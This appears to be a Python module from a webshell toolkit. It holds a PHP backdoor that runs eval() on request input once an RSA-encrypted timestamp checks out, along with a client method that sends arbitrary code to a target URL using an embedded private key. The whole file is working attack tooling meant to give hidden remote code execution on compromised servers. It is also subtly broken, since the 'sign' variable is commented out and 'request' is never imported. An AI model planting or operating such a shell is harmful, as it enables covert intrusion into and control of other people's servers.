


from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
import base64,time

from webshell.shellbase import EvalShellBase
 



class Shell1(EvalShellBase):
    CONTENT = '''
<?php

$public_key = "-----BEGIN PUBLIC KEY-----
MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANhV1MObPe2ysarUMyCL0xRddYEi3mFk
/XjKg3Ky0pcskyeHbzunWbZaubY1iRj99n3eXudM1NihkiNkvtPfI9kCAwEAAQ==
-----END PUBLIC KEY-----";
$public_key = openssl_pkey_get_public($public_key);
@openssl_public_decrypt(base64_decode($_GET[0]),$cipher,$public_key);
if(time()-$cipher<10){
    eval($_REQUEST[1]);
}
?>
'''.replace('\n',' ')
    def __init__(self,url):
        self.url = url

    def run(self,code):
        # 加密
        priv_key = '''-----BEGIN PRIVATE KEY-----
        MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEA2FXUw5s97bKxqtQz
        IIvTFF11gSLeYWT9eMqDcrLSlyyTJ4dvO6dZtlq5tjWJGP32fd5e50zU2KGSI2S+
        098j2QIDAQABAkEAs52H2qRxJYLBCpHGpVYSeg0iu4ZE1t5vqTOTMc8RFBuScywF
        rACMRZ623AumdcNx614/6bClLA+YKNZQlUQfkQIhAO/kxEtzzOcSEGW1DVptF79O
        /Lxsa89hVfO2B1KYNOMtAiEA5twmNpqzYgdJtaXwT5kff1rhJhYjWYST+Og2na/O
        3t0CIC07YDut0PO8tzTGJ4dmTHT46rSIaOeIPdGe/9B1/HrdAiA+N0pdIOgDHS+y
        MpxG919TtSxEVWcFcwNl6z781CqOSQIhAMZkQLPl3dzTT1Srn0Wb1cl5HczB95cs
        ok7dXI72eo6S
        -----END PRIVATE KEY-----'''
        # sign = str(int(time.time()))
        rsakey = RSA.importKey(priv_key)
        cipher = Cipher_pkcs1_v1_5.new(rsakey)     #创建用于执行pkcs1_v1_5加密或解密的密码
        cipher_text = base64.b64encode(cipher.encrypt(sign.encode('utf-8')))
        return request.post(url=self.url+'/?0='+cipher_text.decode('utf-8'),data={"1":code}).text
